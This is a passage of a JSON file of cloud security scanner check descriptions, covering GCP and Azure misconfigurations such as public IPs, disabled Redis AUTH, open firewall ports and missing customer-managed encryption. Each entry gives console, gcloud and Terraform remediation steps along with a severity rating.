        "description": "GCP Vertex AI instances are not private\nDescription\nVertex AI Workbench is a data science service offered by GCP that leverages JupyterLab to explore and access data. Workbenches have public IPs assigned by default which can increase your attack surface and expose sensitive data.\nWe recommend you only assign private IPs to Vertex AI Workbenches.\nFix - Runtime\nGCP Console\nIt's not currently possible to edit a Vertex AI workbench network setting to remove or add a public IP.\nTo create a Vertex AI Workbench with a private IP:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Vertex AI Workbench.\nScroll down to the Networking section and expand.\nLocate the External IP dropdown and select None.\n\nCLI Command\nIt's not currently possible to edit a Vertex AI workbench network settings to remove or add a public IP.\nTo create a private Vertex AI Workbench you'll need to specify the --no-public-ip command. For example:\nShell# To create an instance from a VmImage name\ngcloud beta notebooks instances create example-instance  \\\n  --vm-image-project=deeplearning-platform-release  \\\n  --vm-image-name=tf2-2-1-cu101-notebooks-20200110  \\\n  --machine-type=n1-standard-4  \\\n  --location=us-central1-b  \\\n  --no-public-ip\n\nFix - Buildtime\nTerraform\n\nResource: google_notebooks_instance\nField: no_public_ip\n\nGoresource \"google_notebooks_instance\" \"public_instance\" {\n  name = \"my-notebook\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n\n- no_public_ip = false\n+ no_public_ip = true\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_79": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-sql-database-uses-the-latest-major-version",
        "description": "GCP SQL database does not use the latest Major version\nDescription\nUsing the latest major version for your Google Cloud Platform (GCP) SQL database can help improve the security and reliability of your database. Newer versions of software often include security updates and bug fixes that can help protect your database from potential threats and improve its performance.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_sql_database_instance\" \"pass\" {\n  provider = google-beta\n\n  name             = \"private-instance-${random_id.db_name_suffix.hex}\"\n  region           = \"us-central1\"\n  database_version = \"MYSQL_8_0\"\n\n  depends_on = [google_service_networking_connection.private_vpc_connection]\n\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      ipv4_enabled    = false\n      private_network = google_compute_network.private_network.id\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_95": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-is-auth-enabled",
        "description": "GCP Memorystore for Redis has AUTH disabled\nMemorystore for Redis has AUTH disabled\nDescription\nAUTH is an optional security feature on Memorystore for Redis that requires incoming connections to authenticate with an AUTH string. Every AUTH string is a Universally Unique Identifier (UUID), and each Redis instance with AUTH enabled has a unique AUTH string.\nWhen you enable the AUTH feature on your Memorystore instance, incoming client connections must authenticate in order to connect. Once a client authenticates with an AUTH string, it remains authenticated for the lifetime of that connection, even if you change the AUTH string.\nWe recommend that you enble AUTH on your Memorystore for Redis database to protect against unwanted or non-approved connections.\nFix - Runtime\nGCP Console\nTo enable AUTH on your Memorystore for Redis database:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Memorystore for Redis.\nView your instance's Instance details page by clicking on your Instance ID.\nSelect the EDIT button.\nScroll to the Security section and select the checkbox for Enable AUTH.\n\nCLI Command\nTo enable AUTH on your Memorystore for Redis instance execute the following command:\nsupported_resourcesgcloud beta redis instances update INSTANCE-ID \\\n  --enable-auth \\\n  --region=REGION\n\nReplace INSTANCE-ID with your Memorystore for Redis instance ID. Replace REGION with the region where your Memorystore for Redis database lives.\nFix - Buildtime\nTerraform\n\nResource: google_redis_instance\nField: auth_enabled\n\nGoresource \"google_redis_instance\" \"cache\" {\n  name           = \"memory-cache\"\n  display_name   = \"memory cache db\"\n  tier           = \"STANDARD_HA\"\n  memory_size_gb = 1\n\n- auth_enabled = false\n+ auth_enabled = true\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_88": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-compute-firewall-ingress-does-not-allow-unrestricted-mysql-access",
        "description": "GCP Firewall rule allows all traffic on MySQL DB port (3306)\nDescription\nIt is a best practice to ensure that your firewall ingress rules do not allow unrestricted access to your MySQL database, as it can increase the risk of unauthorized access or attacks on your database. By restricting access to only specific IP addresses or ranges that you trust, you can help secure your database from potential threats. Additionally, you can use tools like SSL/TLS to encrypt the connection between your database and client, which can help protect against interception of sensitive data.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"3306\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_106": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-unrestricted-http-port-80-access",
        "description": "GCP Firewall rule allows all traffic on HTTP port (80)\nDescription\nYou should also consider restricting access to HTTP port 80 to only the IP addresses or ranges that need it. This can help reduce the risk of your network being accessed by unauthorized users or devices, and can also help reduce the risk of attacks such as denial of service (DoS) or distributed denial of service (DDoS) attacks.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"80\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ssh\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_86": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-cloud-build-workers-are-private",
        "description": "GCP cloud build workers are not private\nDescription\nGoogle Cloud Build is a fully managed continuous integration and delivery platform that allows developers to build, test, and deploy applications on Google Cloud Platform. When you create a build using Cloud Build, the service automatically provisions a build worker to execute the build.\nBuild workers are virtual machines that are used to run the build steps defined in your build configuration. They are responsible for executing the commands specified in your build configuration, such as building a Docker image, running tests, or deploying an application.\nBuild workers can be either public or private. Public build workers have internet access and can access external resources or services, while private build workers do not have internet access and are isolated from external networks. You can choose which type of worker to use based on your build requirements and the level of security and isolation you need.\nWe recommend you remove the public IPs for your Data Fusion instance. By isolating your build workers from the internet, you can reduce the risk of external threats such as hackers or malware infiltrating your build environment.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_cloudbuild_worker_pool\" \"pass\" {\n  name = \"my-pool\"\n  location = \"europe-west1\"\n  worker_config {\n    disk_size_gb = 100\n    machine_type = \"e2-standard-4\"\n    no_external_ip = true\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_85": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-big-table-instances-are-encrypted-with-customer-supplied-encryption-keys-cseks",
        "description": "GCP Big Table Instances are not encrypted with Customer Supplied Encryption Keys (CSEKs)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Big Table Instances. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_bigtable_instance\nArguments: cluster.kms_key_name\n\nGoresource \"google_bigtable_instance\" \"pass\" {\n  name = \"tf-instance\"\n\n  cluster {\n    cluster_id   = \"tf-instance-cluster\"\n    num_nodes    = 1\n    storage_type = \"HDD\"\n    kms_key_name = google_kms_crypto_key.example.name\n  }\n\n  labels = {\n    my-label = \"prod-label\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_80": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek",
        "description": "GCP Big Query Tables are not encrypted with Customer Supplied Encryption Keys (CSEK)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Big Query Tables. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_bigquery_table\nArguments: encryption_configuration.kms_key_name\n\nGoresource \"google_bigquery_table\" \"pass\" {\n  dataset_id = google_bigquery_dataset.default.dataset_id\n  table_id   = \"sheet\"\n\n  external_data_configuration {\n    autodetect    = true\n    source_format = \"GOOGLE_SHEETS\"\n\n    google_sheets_options {\n      skip_leading_rows = 1\n    }\n\n    source_uris = [\n      \"https://docs.google.com/spreadsheets/d/123456789012345\",\n    ]\n  }\n\n  encryption_configuration {\n    kms_key_name = var.kms_key_name\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_103": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-does-not-have-a-public-ip",
        "description": "GCP Dataproc Clusters have public IPs\nDescription\nDataproc is commonly used for data lake modernization, ETL, and data science workloads. A Dataproc cluster contains at least one \"management\" VM and one \"compute\" VM which are deployed into a VPC network. A common misconfiguration is creating a Dataproc cluster with public IPs. This security misconfiguration could put your data at risk of accidental exposure, because a public IP accompanied by an open firewall rule allows potentially unauthorized access to the underlining Dataproc VMs.\nWe recommend you only assign private IPs to your Dataproc clusters.\nFix - Runtime\nGCP Console\nIt is not currently possible to edit a running Dataproc cluster to remove it's public IPs.\nTo create a Dataproc cluster with only private IPs:\n\nLog in to the GCP Console.\nNavigate to Dataproc.\nSelect Customize Cluster to view Network Configuration settings.\nLocate the Internal IP Only section and select the checkbox next to Configure all instances to have only internal IP addresses\n\nCLI Command\nIt is not currently possible to edit a running Dataproc cluster to remove it's public IPs.\nTo create a Dataproc cluster with only private IPs you need to specify the --no-address flag. As an example:\nShellgcloud beta dataproc clusters create my_cluster  \\\n  --region=us-central1  \\\n  --no-address\n\nFix - Buildtime\nTerraform\n\nResource: google_dataproc_cluster\nField: internal_ip_only\n\nGoresource \"google_dataproc_cluster\" \"accelerated_cluster\" {\n  name   = \"my-cluster-with-gpu\"\n  region = \"us-central1\"\n\n  cluster_config {\n    gce_cluster_config {\n      zone = \"us-central1-a\"\n-     internal_ip_only = false\n+     internal_ip_only = true\n    }\n\n    master_config {\n      accelerators {\n        accelerator_type  = \"nvidia-tesla-k80\"\n        accelerator_count = \"1\"\n      }\n    }\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_GCP_82": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-kms-keys-are-protected-from-deletion",
        "description": "GCP KMS keys are not protected from deletion\nDescription\nProtecting your Google Cloud Platform (GCP) KMS keys from deletion can help ensure the security and integrity of your keys. KMS keys are used to encrypt and decrypt data, and deleting them can cause data loss and disrupt the operation of your systems.\nBy protecting your KMS keys from deletion, you can help prevent accidental or unauthorized deletion of your keys. This can help ensure that your keys are always available when needed, and can help protect your data from potential security threats such as data breaches or unauthorized access.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_kms_crypto_key\" \"pass\" {\n  name            = \"crypto-key-example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"15552000s\"\n\n  lifecycle {\n    prevent_destroy = true\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_76": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-private-google-access-is-enabled-for-ipv6",
        "description": "GCP VPC Network subnets have Private Google access disabled\nDescription\nEnabling Private Google Access for IPv6 can help improve the security of your Google Cloud Platform (GCP) resources by allowing them to access Google APIs and services over IPv6 networks, rather than over the public internet. This can help reduce the risk of your traffic being intercepted or tampered with, as it is routed through Google's private network. Additionally, Private Google Access can help improve the performance and reliability of your GCP resources by reducing network latency and eliminating the need to route traffic through third-party networks.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_compute_subnetwork\" \"pass_bidi\" {\n  name             = \"log-test-subnetwork\"\n  ip_cidr_range    = \"10.2.0.0/16\"\n  stack_type       = \"IPV4_IPV6\"\n  ipv6_access_type = \"EXTERNAL\"\n  region           = \"us-central1\"\n  network          = google_compute_network.custom-test.id\n  # purpose=\"INTERNAL_HTTPS_LOAD_BALANCER\" if set ignored\n  # log_config {\n  #   metadata=\"EXCLUDE_ALL_METADATA\"\n  # }\n  private_ip_google_access   = true\n  private_ipv6_google_access = \"ENABLE_BIDIRECTIONAL_ACCESS_TO_GOOGLE\"\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_90": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-data-flow-jobs-are-encrypted-with-customer-supplied-encryption-keys-csek",
        "description": "GCP data flow jobs are not encrypted with Customer Supplied Encryption Keys (CSEK)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical data flow jobs. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_dataflow_job\nArguments: kms_key_name\n\nGoresource \"google_dataflow_job\" \"pass\" {\n  name              = \"dataflow-job\"\n  template_gcs_path = \"gs://my-bucket/templates/template_file\"\n  temp_gcs_location = \"gs://my-bucket/tmp_dir\"\n  parameters = {\n    foo = \"bar\"\n    baz = \"qux\"\n  }\n  kms_key_name = \"SecretSquirrel\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_GCP_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-legacy-networks-do-not-exist-for-a-project",
        "description": "GCP project is configured with legacy network\nDescription\nIn order to prevent use of legacy networks, a project should not have a legacy network configured.\nLegacy networks have a single network IPv4 prefix range and a single gateway IP address for the whole network. The network is global in scope and spans all cloud regions. Subnetworks cannot be created in a legacy network and are unable to switch from legacy to auto or custom subnet networks. Legacy networks can have an impact for high network traffic projects and are subject to a single point of contention or failure.\nFix - Buildtime \nTerraform\n\nResource: google_project\nArgument: google_compute_network\n\nGoresource \"google_project\" \"bad_project\" {\n  name       = \"My Project\"\n  project_id = \"bad\"\n  org_id     = \"1234567\"\n}\n\nresource \"google_compute_network\" \"vpc_network_bad\" {\n  name = \"vpc-legacy\"\n- auto_create_subnetworks = true\n  project = google_project.bad_project.id\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_104": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-logging-enabled",
        "description": "GCP DataFusion does not have stack driver logging enabled\nDescription\nIt is recommended to have a proper logging process for GCP DataFusion stack driver in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_data_fusion_instance\" \"pass\" {\n  project                       = \"examplea\"\n  provider                      = google-beta\n  name                          = \"my-instance\"\n  description                   = \"My Data Fusion instance\"\n  region                        = \"us-central1\"\n  type                          = \"BASIC\"\n   enable_stackdriver_logging    = true\n   enable_stackdriver_monitoring = true\n  labels = {\n    example_key = \"example_value\"\n  }\n  //private_instance = false\n  network_config {\n    network       = \"default\"\n    ip_allocation = \"10.89.48.0/22\"\n  }\n  version                  = \"6.3.0\"\n  dataproc_service_account = data.google_app_engine_default_service_account.default.email\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_83": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topics-are-encrypted-with-customer-supplied-encryption-keys-csek",
        "description": "GCP Pub/Sub Topics are not encrypted with Customer Supplied Encryption Keys (CSEK)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Pub/Sub Topics. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource: google_pubsub_topic\nArguments: kms_key_name\n\nGoresource \"google_pubsub_topic\" \"pass\" {\n  name         = \"example-topic\"\n  kms_key_name = google_kms_crypto_key.crypto_key.id\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_75": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-unrestricted-ftp-access",
        "description": "GCP Firewall rule allows all traffic on FTP port (21)\nDescription\nFix - Runtime\nFix - Buildtime\nTerraform\nGo# pass\n\nresource \"google_compute_firewall\" \"restricted\" {\n  name    = \"example\"\n  network = \"google_compute_network.vpc.name\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"21\"]\n  }\n\n  source_ranges = [\"172.1.2.3/32\"]\n  target_tags   = [\"ftp\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_105": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-monitoring-enabled",
        "description": "GCP DataFusion does not have stack driver monitoring enabled\nDescription\nEnabling Stackdriver monitoring for your Google Cloud Platform (GCP) DataFusion instance can help improve the security and management of your data. Stackdriver is a monitoring and logging service that allows you to track the performance and health of your GCP resources.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_data_fusion_instance\" \"pass\" {\n  project                       = \"examplea\"\n  provider                      = google-beta\n  name                          = \"my-instance\"\n  description                   = \"My Data Fusion instance\"\n  region                        = \"us-central1\"\n  type                          = \"BASIC\"\n   enable_stackdriver_logging    = true\n   enable_stackdriver_monitoring = true\n  labels = {\n    example_key = \"example_value\"\n  }\n  //private_instance = false\n  network_config {\n    network       = \"default\"\n    ip_allocation = \"10.89.48.0/22\"\n  }\n  version                  = \"6.3.0\"\n  dataproc_service_account = data.google_app_engine_default_service_account.default.email\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_91": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-dataproc-cluster-is-encrypted-with-customer-supplied-encryption-keys-cseks",
        "description": "GCP Dataproc cluster is not encrypted with Customer Supplied Encryption Keys (CSEKs)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Dataproc cluster. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n\nResource:google_dataproc_cluster\nArguments: cluster_config.encryption_config.kms_key_name\n\nGoresource \"google_dataproc_cluster\" \"pass\" {\n  name   = \"simplecluster\"\n  region = \"us-central1\"\n  cluster_config {\n     encryption_config{\n       kms_key_name=\"SecretSquirrel\"\n     }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_81": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-big-query-tables-are-encrypted-with-customer-supplied-encryption-keys-csek-1",
        "description": "GCP Big Query Tables are not encrypted with Customer Supplied Encryption Keys (CSEK)\nDescription\nCustomer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage that is available for Big Query Tables. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.\nWe recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Big Query Tables. This helps protect the Google-generated keys used to encrypt and decrypt your data.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_bigquery_dataset\" \"pass\" {\n  dataset_id                  = var.dataset.dataset_id\n  friendly_name               = var.dataset.friendly_name\n  description                 = var.dataset.description\n  location                    = var.location\n  default_table_expiration_ms = var.dataset.default_table_expiration_ms\n\n  default_encryption_configuration {\n    kms_key_name = google_kms_crypto_key.example.name\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_97": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-memorystore-for-redis-uses-intransit-encryption",
        "description": "GCP Memorystore for Redis does not use intransit encryption\nDescription\nThis policy identifies the GCP Memorystore for Redis that are configured with disabled in-transit data encryption. It is recommended that these resources will be configured with in-transit data encryption to minimize risk for sensitive data being leaked.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoesource \"google_redis_instance\" \"pass\" {\n  provider       = google-beta\n  name           = \"mrr-memory-cache\"\n  tier           = \"STANDARD_HA\"\n  memory_size_gb = 5\n\n  location_id             = \"us-central1-a\"\n  alternative_location_id = \"us-central1-f\"\n\n  authorized_network = data.google_compute_network.redis-network.id\n\n  redis_version      = \"REDIS_6_X\"\n  display_name       = \"Terraform Test Instance\"\n  reserved_ip_range  = \"192.168.0.0/28\"\n  replica_count      = 5\n  read_replicas_mode = \"READ_REPLICAS_ENABLED\"\n  # auth_enabled=true\n  labels = {\n    my_key    = \"my_val\"\n    other_key = \"other_val\"\n  }\n  transit_encryption_mode = \"SERVER_AUTHENTICATION\"\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_74": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-subnet-has-a-private-ip-google-access",
        "description": "GCP subnet does not have a private IP Google access\nDescription\nEnabling private IP Google access for your Google Cloud Platform (GCP) subnet can help improve the security and performance of your network. Private IP Google access allows resources in your subnet to access Google APIs and services over a private IP connection, rather than a public connection.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_compute_subnetwork\" \"pass\" {\n  name          = \"example\"\n  ip_cidr_range = \"10.0.0.0/16\"\n  network       = \"google_compute_network.vpc.self_link\"\n\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n  private_ip_google_access = true\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_87": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-data-fusion-instances-are-private",
        "description": "GCP data fusion instances are not private\nDescription\nGCP Data fusion is a fully managed, cloud-native data integration service that helps users build and manage ETL (extract, transform, and load) pipelines. It is designed to simplify and accelerate the process of building and maintaining data pipelines, allowing users to create data pipelines that can ingest data from a variety of sources, transform and cleanse the data, and then load the data into a destination of their choice.\nA Data Fusion instance is a logical container that is used to host and run data pipelines. It is created within a Google Cloud project, and users can create multiple instances within a single project. Each instance has its own resources and configuration settings, allowing users to tailor the instance to their specific needs.\nWe recommend you remove the public IPs for your Data Fusion instance.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"google_data_fusion_instance\" \"pass\" {\n  provider = google-beta\n  name = \"my-instance\"\n  description = \"My Data Fusion instance\"\n  region = \"us-central1\"\n  type = \"BASIC\"\n  enable_stackdriver_logging = true\n  enable_stackdriver_monitoring = true\n  labels = {\n    example_key = \"example_value\"\n  }\n  private_instance = true\n  network_config {\n    network = \"default\"\n    ip_allocation = \"10.89.48.0/22\"\n  }\n  version = \"6.3.0\"\n  dataproc_service_account = data.google_app_engine_default_service_account.default.email\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_102": {
        "url": "https://docs.bridgecrew.io/docs/ensure-cloud-run-service-is-not-anonymously-or-publicly-accessible",
        "description": "GCP Cloud Run services are anonymously or publicly accessible\nDescription\nCloud Run services are fully managed serverless environments used to develop and deploy containerized applications. In GCP, Cloud Run services support a wide variety of authentication methods to execute (invoke) the container. One of those methods is based to the usage of two special IAM principals: allUsers and allAuthenticatedUsers. When those IAM principals have access to the Cloud Run service - anyone on the internet can execute or access the Cloud Run service.\nWe recommend you ensure that neither anonymous or public access to Cloud Run services are allowed.\nFix - Runtime\nGCP Console\nTo remove anonymous or public access to your Cloud Run service:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud Run.\nView your service's Service details page by clicking on your Service Name.\nSelect the PERMISSIONS tab.\nTo remove a specific role assignment, select allUsers or allAuthenticatedUsers, and then click Delete.\n\nCLI Command\nTo remove anonymous or public access to your Cloud Run service execute the following command:\nShellgcloud run services remove-iam-policy-binding SERVICE-NAME \\\n    --member=MEMBER-TYPE \\\n    --role=ROLE\n\nReplace SERVICE-NAME with your Cloud Run service name. Replace MEMBER-TYPE with the member you want to delete (either allUsers or allAuthenticatedUsers). Replace ROLE the IAM member's assigned role.\nFix - Buildtime\nTerraform\n\n\nResource: google_cloud_run_service_iam_binding\n\n\nField: members\n\n\nResource: google_cloud_run_service_iam_member\n\n\nField: member\n\n\nGoresource \"google_cloud_run_service_iam_binding\" \"public_binding\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/run.invoker\"\n\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\",\n  ]\n}\n\nresource \"google_cloud_run_service_iam_member\" \"public_member\" {\n  location = google_cloud_run_service.default.location\n  service = google_cloud_run_service.default.name\n  role = \"roles/run.invoker\"\n\n-  member = \"allUsers\"\n-  member = \"allAuthenticatedUsers\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-cloud-kms-key-rings-is-not-publicly-accessible-1",
        "description": "GCP Cloud KMS Key Rings are anonymously or publicly accessible\nDescription\nGCP Cloud KMS key rings contain your encryption keys, and allowing anonymous or public access to a key ring grants permissions for anyone to access the cryptokeys stored inside the ring. CryptoKeys should only be accessed by trusted parties because they are commonly used to protect sensitive data.\n\u200b\nWe recommend you ensure anonymous and public access to KMS key rings is not allowed.\nFix - Runtime\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Key Management.\nOn the Key Rings details page, select your key ring.\nClick the SHOW INFO PANEL side bar.\nTo remove a specific role assignment, to the front of allUsers and allAuthenticatedUsers, click Delete.\n\nCLI Command\nTo remove access to allUsers and allAuthenticatedUsers, use the following command:\ngcloud kms keyrings remove-iam-policy-binding KEY-RING \\\n    --location LOCATION \\\n    --member PRINCIPAL \\\n    --role roles/ROLE-NAME\n\nReplace KEY-RING with the name of the key ring. Replace LOCATION with the location of the key ring. Replace PRINCIPAL with either allUsers or allAuthenticatedUsers. Replace ROLE-NAME with the name of the role to remove.\nFix - Buildtime\nTerraform\n\nResource: google_kms_key_ring_iam_member\nField: member\n\u200b\nResource: google_kms_key_ring_iam_binding\nField: members\n\nText//Option 1\nresource \"google_kms_key_ring_iam_member\" \"member\" {\n  key_ring_id = google_kms_key_ring.default.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n-  member        = \"allUsers\"\n-  member        = \"allAuthenticatedUsers\"\n}\n\u200b\n//Option 2\nresource \"google_kms_key_ring_iam_binding\" \"binding\" {\n  key_ring_id = google_kms_key_ring.default.id\n  role          = \"roles/cloudkms.cryptoKeyEncrypter\"\n  members = [\n-    \"allUsers\",\n-    \"allAuthenticatedUsers\"\n  ]\n}\n",
        "severity": "HIGH"
    },
    "CKV2_AZURE_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-va-setting-also-send-email-notifications-to-admins-and-subscription-owners-is-set-for-an-sql-server",
        "description": "Azure SQL server ADS VA Also send email notifications to admins and subscription owners is disabled\nDescription\nEnable Vulnerability Assessment (VA) setting 'Also send email notifications to admins and subscription owners'.\nVA scan reports and alerts will be sent to admins and subscription owners by enabling setting 'Also send email notifications to admins and subscription owners'. This may help in reducing time required for identifying risks and taking corrective measures.\nFix - Buildtime \nTerraform\n\nResource: azurerm_resource_group, azurerm_sql_server, azurerm_storage_account, azurerm_storage_container, azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment\n\nGoresource \"azurerm_resource_group\" \"okExample\" {\n  name     = \"okExample-resources\"\n  location = \"West Europe\"\n}\n\nresource \"azurerm_sql_server\" \"okExample\" {\n  name                         = \"mysqlserver\"\n  resource_group_name          = azurerm_resource_group.okExample.name\n  location                     = azurerm_resource_group.okExample.location\n  version                      = \"12.0\"\n  administrator_login          = \"4dm1n157r470r\"\n  